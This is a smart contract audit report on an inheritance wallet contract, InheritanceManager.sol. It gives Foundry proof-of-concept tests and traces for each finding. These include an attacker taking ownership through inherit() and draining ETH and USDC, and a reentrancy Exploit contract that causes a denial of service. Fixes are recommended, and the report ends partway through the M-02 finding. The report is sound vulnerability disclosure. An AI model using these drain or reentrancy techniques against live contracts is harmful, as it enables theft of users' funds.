# Inheritable Smart Contract Wallet Audit
- Scope
    - InheritanceManager.sol
    - NFTFactory.sol
    - Trustee.sol 
- Findings
    - High: 4  
    (Valid-High) [H-01: Anyone can call `InheritanceManager.sol::inherit()` and become contract owner, which can result in loss of funds](#high-01)  
    (Invalid) [H-02: `InheritanceManager.sol::withdrawInheritedFunds` is vulnerable to reentrancy and can cause DOS, which prevents beneficiaries from withdrawing funds](#high-02)  
    (Valid-High) [H-03: `InheritanceManager.sol::buyOutEstateNFT()` pays wrong amount to beneficiaries](#high-03)  
    (Valid-High) [H-04: `InheritanceManager.sol::buyOutEstateNFT()` may end prematurely and not pay remaining beneficiaries](#high-04)  
    - Medium: 2  
    (Valid-Low) [M-01: `InheritanceManager.sol::withdrawInheritedFunds()` rounding error in calculation amount per beneficiary receives](#med-01)  
    (Valid-Low) [M-02: `InheritanceManager.sol::buyOutEstateNFT()` finalAmount calculation may cause rounding error](#med-02)  
    - Low: 2  
    (Invalid) [L-01: Users may lose access to primary wallet and gets funds stucked before adding secondary wallet as beneficiary](#low-01)  
    (Valid-Medium) [L-02: Multiple functions do not reset the 90 days timer](#low-02)  
    
    
    
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

## <a id="high-01"></a>H-01: Anyone can call `InheritanceManager.sol::inherit()` and become contract owner, which can result in loss of funds

### Summary
If only 1 address has been added as beneficiary, anyone can call `InheritanceManager.sol::inherit()` and become the owner of the InheritanceManager contract to drain all of the funds.

### Vulnerability Details
```
function inherit() external {
        if (block.timestamp < getDeadline()) {
            revert InactivityPeriodNotLongEnough();
        }
        if (beneficiaries.length == 1) {
@>            owner = msg.sender;
            _setDeadline();
        } else if (beneficiaries.length > 1) {
            isInherited = true;
        } else {
            revert InvalidBeneficiaries();
        }
    }
```

### Impact/Proof of Concept
```
function test_inheritSetsMsgSenderAsOwnerAndDrainFunds() public {
        // Create attacker
        address attacker = makeAddr("attacker");

        // Give IM funds
        usdc.mint(address(im), 10e6);
        vm.deal(address(im), 10e18);
        console.log("IM USDC balance:",usdc.balanceOf(address(im)));
        console.log("IM ETH balance:",address(im).balance);

        // Owner add 1 beneficiary
        vm.startPrank(owner);
        im.addBeneficiery(user1);
        vm.stopPrank();

        // Fast forward 90 days
        vm.warp(90 days + 1);

        // Attacker calls inherit and becomes owner
        vm.startPrank(attacker);
        im.inherit();
        vm.assertEq(im.getOwner(), attacker);
        console.log("attacker addr:", attacker);
        console.log("IM owner:", im.getOwner());

        // Drain funds
        im.sendERC20(address(usdc), usdc.balanceOf(address(im)), attacker);
        im.sendETH(address(im).balance, attacker);
        vm.stopPrank();
        assertEq(usdc.balanceOf(address(im)), 0);
        assertEq(address(im).balance, 0);
        console.log("IM USDC balance:",usdc.balanceOf(address(im)));
        console.log("IM ETH balance:",address(im).balance);
    }
```
Results
```diff
[PASS] test_inheritSetsMsgSenderAsOwnerAndDrainFunds() (gas: 195310)
Logs:
  IM USDC balance: 10000000
  IM ETH balance: 10000000000000000000
  attacker addr: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
  IM owner: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
  IM USDC balance: 0
  IM ETH balance: 0

Traces:
  [195310] InheritanceManagerTest::test_inheritSetsMsgSenderAsOwnerAndDrainFunds()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]
    ├─ [0] VM::label(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], "attacker")
    │   └─ ← [Return] 
    ├─ [46784] ERC20Mock::mint(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 10000000 [1e7])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], value: 10000000 [1e7])
    │   └─ ← [Stop] 
    ├─ [0] VM::deal(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 10000000000000000000 [1e19])
    │   └─ ← [Return] 
    ├─ [559] ERC20Mock::balanceOf(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA]) [staticcall]
    │   └─ ← [Return] 10000000 [1e7]
    ├─ [0] console::log("IM USDC balance:", 10000000 [1e7]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log("IM ETH balance:", 10000000000000000000 [1e19]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(owner: [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266])
    │   └─ ← [Return] 
    ├─ [69020] InheritanceManager::addBeneficiery(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::warp(7776001 [7.776e6])
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return] 
    ├─ [3672] InheritanceManager::inherit()
    │   └─ ← [Stop] 
    ├─ [419] InheritanceManager::getOwner() [staticcall]
    │   └─ ← [Return] attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]
    ├─ [0] VM::assertEq(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   └─ ← [Return] 
    ├─ [0] console::log("attacker addr:", attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [419] InheritanceManager::getOwner() [staticcall]
    │   └─ ← [Return] attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]
    ├─ [0] console::log("IM owner:", attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [559] ERC20Mock::balanceOf(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA]) [staticcall]
    │   └─ ← [Return] 10000000 [1e7]
    ├─ [27796] InheritanceManager::sendERC20(ERC20Mock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000000 [1e7], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   ├─ [559] ERC20Mock::balanceOf(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA]) [staticcall]
    │   │   └─ ← [Return] 10000000 [1e7]
    │   ├─ [25204] ERC20Mock::transfer(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 10000000 [1e7])
    │   │   ├─ emit Transfer(from: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], value: 10000000 [1e7])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [32978] InheritanceManager::sendETH(10000000000000000000 [1e19], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   ├─ [0] attacker::fallback{value: 10000000000000000000}()
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [559] ERC20Mock::balanceOf(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return] 
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return] 
    ├─ [559] ERC20Mock::balanceOf(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] console::log("IM USDC balance:", 0) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log("IM ETH balance:", 0) [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.04ms (259.37µs CPU time)
```
### Recommendations
If the intention is to reclaim the contract from beneficiary[0], to set beneficiary[0] as the contract owner instead of msg.sender

## <a id="high-02"></a>H-02: `InheritanceManager.sol::withdrawInheritedFunds` is vulnerable to reentrancy and can cause DOS, which prevents beneficiaries from withdrawing funds

### Summary
The `InheritanceManager.sol::withdrawInheritedFunds()` function is vulnerable to reentrancy, allowing a malicious beneficiary to repeatedly call the function. Although this reentrancy does not grant the attacker more funds, but it can lead to a Denial of Service (DoS) by draining the contract balance prematurely, causing subsequent transfers to revert due to insufficient funds. And if the private keys to the owner is lost, there will be no way to remove the malicious beneficiary, causing the funds to be stuck in the contract.

### Vulnerability Details
```
function withdrawInheritedFunds(address _asset) external {
        if (!isInherited) {
            revert NotYetInherited();
        }
        uint256 divisor = beneficiaries.length;
        if (_asset == address(0)) {
            uint256 ethAmountAvailable = address(this).balance;
            uint256 amountPerBeneficiary = ethAmountAvailable / divisor;
            for (uint256 i = 0; i < divisor; i++) {
                address payable beneficiary = payable(beneficiaries[i]);
@>                (bool success,) = beneficiary.call{value: amountPerBeneficiary}("");
                require(success, "something went wrong");
            }
        } else {
            uint256 assetAmountAvailable = IERC20(_asset).balanceOf(address(this));
            uint256 amountPerBeneficiary = assetAmountAvailable / divisor;
            for (uint256 i = 0; i < divisor; i++) {
@>                IERC20(_asset).safeTransfer(beneficiaries[i], amountPerBeneficiary); 
            }
        }
    }
```

### Impact/Proof of Concept
```
contract Exploit {
    InheritanceManager im;

    constructor(InheritanceManager _im) {
        im = _im;
    }

    receive() external payable {
        // If IM contract balance more than 6e18 then reenter (for testing sake)
        if(address(im).balance >= 6e18){
            console.log('IM balance:',address(im).balance);
            im.withdrawInheritedFunds(address(0));
        }
    }
}
function test_withdrawInheritedFundsReentrancyCausesDOS() public {
        // Give the IM 10 ETH
        vm.deal(address(im), 9e18);
        console.log("IM initial ETH balance:", address(im).balance);

        // Create 2 more beneficiaries
        Exploit exploiter = new Exploit(im);
        address user2 = makeAddr("user2");
        

        // Add all 3 users as beneficiaries
        vm.startPrank(owner);
        im.addBeneficiery(address(exploiter));
        im.addBeneficiery(user1);
        im.addBeneficiery(user2);
        vm.stopPrank();

        // Fast forward 90days and start inherit
        vm.warp(90 days + 1);
        vm.startPrank(address(exploiter));
        im.inherit();

        // Withdraw Ether
        vm.expectRevert("something went wrong");
        im.withdrawInheritedFunds(address(0));
        vm.stopPrank();
    }

```
Results
```diff
[PASS] test_withdrawInheritedFundsReentrancyCausesDOS() (gas: 390169)
Logs:
  IM initial ETH balance: 9000000000000000000
  IM balance: 6000000000000000000

Traces:
  [390169] InheritanceManagerTest::test_withdrawInheritedFundsReentrancyCausesDOS()
    ├─ [0] VM::deal(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 9000000000000000000 [9e18])
    │   └─ ← [Return] 
    ├─ [0] console::log("IM initial ETH balance:", 9000000000000000000 [9e18]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [106080] → new Exploit@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
    │   └─ ← [Return] 418 bytes of code
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802]
    ├─ [0] VM::label(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], "user2")
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(owner: [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266])
    │   └─ ← [Return] 
    ├─ [69020] InheritanceManager::addBeneficiery(Exploit: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a])
    │   └─ ← [Stop] 
    ├─ [23120] InheritanceManager::addBeneficiery(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Stop] 
    ├─ [23120] InheritanceManager::addBeneficiery(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802])
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::warp(7776001 [7.776e6])
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(Exploit: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a])
    │   └─ ← [Return] 
    ├─ [22686] InheritanceManager::inherit()
    │   └─ ← [Stop] 
    ├─ [0] VM::expectRevert(something went wrong)
    │   └─ ← [Return] 
    ├─ [94638] InheritanceManager::withdrawInheritedFunds(0x0000000000000000000000000000000000000000)
    │   ├─ [79356] Exploit::receive{value: 3000000000000000000}()
    │   │   ├─ [0] console::log("IM balance:", 6000000000000000000 [6e18]) [staticcall]
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [77789] InheritanceManager::withdrawInheritedFunds(0x0000000000000000000000000000000000000000)
    │   │   │   ├─ [279] Exploit::receive{value: 2000000000000000000}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [0] user1::fallback{value: 2000000000000000000}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [0] user2::fallback{value: 2000000000000000000}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   ├─ [0] user1::fallback{value: 3000000000000000000}()
    │   │   └─ ← [OutOfFunds] EvmError: OutOfFunds
    │   └─ ← [Revert] revert: something went wrong
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.12ms (1.34ms CPU time)
```
### Recommendations
Implement a beneficiary self claiming method to withdraw funds instead.

## <a id="high-03"></a>H-03: `InheritanceManager.sol::buyOutEstateNFT()` pays wrong amount to beneficiaries

### Summary
The `InheritanceManager.sol::buyOutEstateNFT()` function calculates wroung amount of ERC20 token to be transferred to the beneficiaries. As the totalAmount is divided by divisor instead of multiplier.

### Vulnerability Details
```
function buyOutEstateNFT(uint256 _nftID) external onlyBeneficiaryWithIsInherited {
        uint256 value = nftValue[_nftID];
        uint256 divisor = beneficiaries.length;
        uint256 multiplier = beneficiaries.length - 1;
        uint256 finalAmount = (value / divisor) * multiplier;
        IERC20(assetToPay).safeTransferFrom(msg.sender, address(this), finalAmount);
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            if (msg.sender == beneficiaries[i]) {
                return;
            } else {
@>                IERC20(assetToPay).safeTransfer(beneficiaries[i], finalAmount / divisor);
            }
        }
        nft.burnEstate(_nftID);
    }
```

### Impact/Proof of Concept
In this POC, assuming NFT value is 2 USDC and there are 2 beneficiaries. After the 2nd beneficiary pays 2 USDC to buy the NFT, the 1st beneficiary should receive 1 USDC, but instead only receives 0.5 USDC
```
function test_buyOutEstateNFTPaysWrongAmount() public {
        // Create 1 more beneficiary
        address user2 = makeAddr("user2");

        // Add the beneficiaries
        vm.startPrank(owner);
        im.addBeneficiery(user1);
        im.addBeneficiery(user2);

        // Create Estate NFT
        uint256 NFTvalue = 2e6;
        im.createEstateNFT("condominium", NFTvalue, address(usdc));
        vm.stopPrank();

        // Fast forward 90 days
        vm.warp(90 days + 1);

        // Give the buyer funds to purchase estate
        usdc.mint(user2, 2e6);
        vm.startPrank(user2);
        usdc.approve(address(im), 2e6);
        im.inherit(); // This set `isInherited` as True to allow buying EstateNFT
        im.buyOutEstateNFT(1);

        // NFT value is 2 USDC, excluding user2's share, user1 should receive 1 USDC
        // However, user1 only receive 5e5 of USDC
        vm.assertNotEq(usdc.balanceOf(user1), 1e6);
        console.log("user1.USDCbalance:", usdc.balanceOf(user1));
    }
```
Results
```diff
[PASS] test_buyOutEstateNFTPaysWrongAmount() (gas: 416766)
Logs:
  user1.USDCbalance: 500000

Traces:
  [416766] InheritanceManagerTest::test_buyOutEstateNFTPaysWrongAmount()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802]
    ├─ [0] VM::label(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], "user2")
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(owner: [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266])
    │   └─ ← [Return] 
    ├─ [69020] InheritanceManager::addBeneficiery(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Stop] 
    ├─ [23120] InheritanceManager::addBeneficiery(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802])
    │   └─ ← [Stop] 
    ├─ [145826] InheritanceManager::createEstateNFT("condominium", 2000000 [2e6], ERC20Mock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   ├─ [95512] NFTFactory::createEstate("condominium")
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], tokenId: 1)
    │   │   ├─ emit MetadataUpdate(_tokenId: 1)
    │   │   └─ ← [Return] 1
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::warp(7776001 [7.776e6])
    │   └─ ← [Return] 
    ├─ [46784] ERC20Mock::mint(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], 2000000 [2e6])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], value: 2000000 [2e6])
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802])
    │   └─ ← [Return] 
    ├─ [24735] ERC20Mock::approve(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 2000000 [2e6])
    │   ├─ emit Approval(owner: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], spender: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], value: 2000000 [2e6])
    │   └─ ← [Return] true
    ├─ [22686] InheritanceManager::inherit()
    │   └─ ← [Stop] 
    ├─ [55920] InheritanceManager::buyOutEstateNFT(1)
    │   ├─ [26058] ERC20Mock::transferFrom(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 1000000 [1e6])
    │   │   ├─ emit Transfer(from: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], to: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], value: 1000000 [1e6])
    │   │   └─ ← [Return] true
    │   ├─ [25204] ERC20Mock::transfer(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], 500000 [5e5])
    │   │   ├─ emit Transfer(from: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], to: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], value: 500000 [5e5])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [559] ERC20Mock::balanceOf(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF]) [staticcall]
    │   └─ ← [Return] 500000 [5e5]
    ├─ [0] VM::assertNotEq(500000 [5e5], 1000000 [1e6]) [staticcall]
    │   └─ ← [Return] 
    ├─ [559] ERC20Mock::balanceOf(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF]) [staticcall]
    │   └─ ← [Return] 500000 [5e5]
    ├─ [0] console::log("user1.USDCbalance:", 500000 [5e5]) [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.23ms (272.89µs CPU time)
```
### Recommendations
Change to the following
```diff
function buyOutEstateNFT(uint256 _nftID) external onlyBeneficiaryWithIsInherited {
        uint256 value = nftValue[_nftID];
        uint256 divisor = beneficiaries.length;
        uint256 multiplier = beneficiaries.length - 1;
        uint256 finalAmount = (value / divisor) * multiplier;
        IERC20(assetToPay).safeTransferFrom(msg.sender, address(this), finalAmount);
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            if (msg.sender == beneficiaries[i]) {
                return;
            } else {
-                IERC20(assetToPay).safeTransfer(beneficiaries[i], finalAmount / divisor);
+                IERC20(assetToPay).safeTransfer(beneficiaries[i], finalAmount / multiplier);
            }
        }
        nft.burnEstate(_nftID);
    }
```

## <a id="high-04"></a>H-04: `InheritanceManager.sol::buyOutEstateNFT()` may end prematurely and not pay remaining beneficiaries

### Summary
In `InheritanceManager.sol::buyOutEstateNFT()`, if the buyer beneficiary is not the last beneficiary, the function will return and end the loop. Causing remaining beneficiaries to not receive their payouts.

### Vulnerability Details
```
function buyOutEstateNFT(uint256 _nftID) external onlyBeneficiaryWithIsInherited {
        uint256 value = nftValue[_nftID];
        uint256 divisor = beneficiaries.length;
        uint256 multiplier = beneficiaries.length - 1;
        uint256 finalAmount = (value / divisor) * multiplier;
        IERC20(assetToPay).safeTransferFrom(msg.sender, address(this), finalAmount);
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            if (msg.sender == beneficiaries[i]) {
@>                return;
            } else {
               IERC20(assetToPay).safeTransfer(beneficiaries[i], finalAmount / divisor);
            }
        }
        nft.burnEstate(_nftID);
    }
```

### Impact/Proof of Concept
User2 who is the buyer and also first beneficiary. After purchasing the NFT, the function ends and does not pay remaining beneficiary (user1).
```
function test_buyOutEstateNFTDoesNotPayRemainingBeneficiaries() public {
        // Create 1 more beneficiary
        address user2 = makeAddr("user2");

        // Add the beneficiaries, in this case we add user2 first
        vm.startPrank(owner);
        im.addBeneficiery(user2);
        im.addBeneficiery(user1);

        // Create Estate NFT
        uint256 NFTvalue = 2e6;
        im.createEstateNFT("condominium", NFTvalue, address(usdc));
        vm.stopPrank();

        // Fast forward 90 days
        vm.warp(90 days + 1);

        // Give the buyer funds to purchase estate
        usdc.mint(user2, 2e6);
        vm.startPrank(user2);
        usdc.approve(address(im), 2e6);
        im.inherit(); // This set `isInherited` as True to allow buying EstateNFT
        im.buyOutEstateNFT(1);

        // user2 has bought the NFT, and because user2 is first beneficiary, the tx return and ends
        // User1 did not receive any payment.
        vm.assertEq(usdc.balanceOf(user1), 0);
        console.log("user1.USDCbalance:", usdc.balanceOf(user1));
    }
```
Results
```diff
[PASS] test_buyOutEstateNFTDoesNotPayRemainingBeneficiaries() (gas: 391490)
Logs:
  user1.USDCbalance: 0

Traces:
  [391490] InheritanceManagerTest::test_buyOutEstateNFTDoesNotPayRemainingBeneficiaries()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802]
    ├─ [0] VM::label(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], "user2")
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(owner: [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266])
    │   └─ ← [Return] 
    ├─ [69020] InheritanceManager::addBeneficiery(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802])
    │   └─ ← [Stop] 
    ├─ [23120] InheritanceManager::addBeneficiery(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Stop] 
    ├─ [145826] InheritanceManager::createEstateNFT("condominium", 2000000 [2e6], ERC20Mock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   ├─ [95512] NFTFactory::createEstate("condominium")
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], tokenId: 1)
    │   │   ├─ emit MetadataUpdate(_tokenId: 1)
    │   │   └─ ← [Return] 1
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::warp(7776001 [7.776e6])
    │   └─ ← [Return] 
    ├─ [46784] ERC20Mock::mint(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], 2000000 [2e6])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], value: 2000000 [2e6])
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802])
    │   └─ ← [Return] 
    ├─ [24735] ERC20Mock::approve(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 2000000 [2e6])
    │   ├─ emit Approval(owner: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], spender: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], value: 2000000 [2e6])
    │   └─ ← [Return] true
    ├─ [22686] InheritanceManager::inherit()
    │   └─ ← [Stop] 
    ├─ [28634] InheritanceManager::buyOutEstateNFT(1)
    │   ├─ [26058] ERC20Mock::transferFrom(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 1000000 [1e6])
    │   │   ├─ emit Transfer(from: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], to: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], value: 1000000 [1e6])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [2559] ERC20Mock::balanceOf(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return] 
    ├─ [559] ERC20Mock::balanceOf(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] console::log("user1.USDCbalance:", 0) [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 939.59µs (253.00µs CPU time)
```
### Recommendations
Change to the following
```diff
function buyOutEstateNFT(uint256 _nftID) external onlyBeneficiaryWithIsInherited {
        uint256 value = nftValue[_nftID];
        uint256 divisor = beneficiaries.length;
        uint256 multiplier = beneficiaries.length - 1;
        uint256 finalAmount = (value / divisor) * multiplier;
        IERC20(assetToPay).safeTransferFrom(msg.sender, address(this), finalAmount);
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            if (msg.sender == beneficiaries[i]) {
-                return;
+                continue;
            } else {
                IERC20(assetToPay).safeTransfer(beneficiaries[i], finalAmount / divisor);
            }
        }
        nft.burnEstate(_nftID);
    }
```

## <a id="med-01"></a>M-01: `InheritanceManager.sol::withdrawInheritedFunds()` rounding error in calculating amount per beneficiary receives

### Summary
`amountPerBeneficiary` in `InheritanceManager.sol::withdrawInheritedFunds()`may have rounding error in certain scenarios when calculating how much ETH or ERC20 token each beneficiary should receive. This is more impactful if the underlying currency has smaller decimals.

### Vulnerability Details
`amountPerBeneficiary` divides the balance available in the contract by the number of beneficiaries. This could result in rounding error and funds to beneficiaries to not receive correct amount.
```
function withdrawInheritedFunds(address _asset) external {
        if (!isInherited) {
            revert NotYetInherited();
        }
        uint256 divisor = beneficiaries.length;
        if (_asset == address(0)) {
            uint256 ethAmountAvailable = address(this).balance;
@>            uint256 amountPerBeneficiary = ethAmountAvailable / divisor;
            for (uint256 i = 0; i < divisor; i++) {
                address payable beneficiary = payable(beneficiaries[i]);
                (bool success,) = beneficiary.call{value: amountPerBeneficiary}("");
                require(success, "something went wrong");
            }
        } else {
            uint256 assetAmountAvailable = IERC20(_asset).balanceOf(address(this));
@>            uint256 amountPerBeneficiary = assetAmountAvailable / divisor;
            for (uint256 i = 0; i < divisor; i++) {
                IERC20(_asset).safeTransfer(beneficiaries[i], amountPerBeneficiary); 
            }
        }
    }
```

### Impact/Proof of Concept
```
function test_withdrawInheritedFundsRoundingError() public {
        // Give the IM 10 ETH and 10 USDC
        usdc.mint(address(im), 10e6);
        vm.deal(address(im), 10e18);
        console.log("IM initial ETH balance:", address(im).balance);
        console.log("IM initial USDC balance:", usdc.balanceOf(address(im)));


        // Create 2 more beneficiaries
        address user2 = makeAddr("user2");
        address user3 = makeAddr("user3");

        // Add all 3 users as beneficiaries
        vm.startPrank(owner);
        im.addBeneficiery(user1);
        im.addBeneficiery(user2);
        im.addBeneficiery(user3);
        vm.stopPrank();
        
        // Fast forward 90days and start inherit
        vm.warp(90 days + 1);
        vm.startPrank(user1);
        im.inherit();

        // Withdraw Ether
        im.withdrawInheritedFunds(address(0));
        console.log("user1.ETHbalance:", user1.balance);
        console.log("user2.ETHbalance:", user2.balance);
        console.log("user3.ETHbalance:", user3.balance);
        console.log("IM remaining ETH balance:", address(im).balance);

        // Withdraw USDC
        im.withdrawInheritedFunds(address(usdc));
        vm.stopPrank();
        console.log("user1.USDCbalance:", usdc.balanceOf(user1));
        console.log("user2.USDCbalance:", usdc.balanceOf(user2));
        console.log("user3.USDCbalance:", usdc.balanceOf(user3));
        console.log("IM remaining USDC balance:", usdc.balanceOf(address(im)));
    }
```
Results
```diff
[PASS] test_withdrawInheritedFundsRoundingError() (gas: 404882)
Logs:
  IM initial ETH balance: 10000000000000000000
  IM initial USDC balance: 10000000
  user1.ETHbalance: 3333333333333333333
  user2.ETHbalance: 3333333333333333333
  user3.ETHbalance: 3333333333333333333
  IM remaining ETH balance: 1
  user1.USDCbalance: 3333333
  user2.USDCbalance: 3333333
  user3.USDCbalance: 3333333
  IM remaining USDC balance: 1
```
### Recommendations
If the underlying ERC20 token has a small decimal, can perform multiplying to increase precision in handling fractional values more effectively.

## <a id="med-02"></a>M-02: `InheritanceManager.sol::buyOutEstateNFT()` finalAmount calculation may cause rounding error

### Summary
